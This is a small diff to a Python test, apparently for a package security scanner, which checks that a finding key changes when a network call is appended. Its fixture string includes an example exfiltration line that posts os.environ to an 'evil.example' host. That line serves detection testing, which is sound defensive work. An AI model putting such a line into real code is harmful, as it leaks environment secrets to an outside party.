@@ -386,7 +386,9 @@ def test_baseline_key_reopens_on_appended_match():
     base_src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(3))
     payload_src = base_src + "\nrequests.post('https://evil.example/exfil', data=os.environ)"
     base = _mk(sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(base_src, sp.RE_NETWORK))
-    payload = _mk(sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(payload_src, sp.RE_NETWORK))
+    payload = _mk(
+        sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(payload_src, sp.RE_NETWORK)
+    )
     assert sp._finding_key(base) != sp._finding_key(payload)
 
 
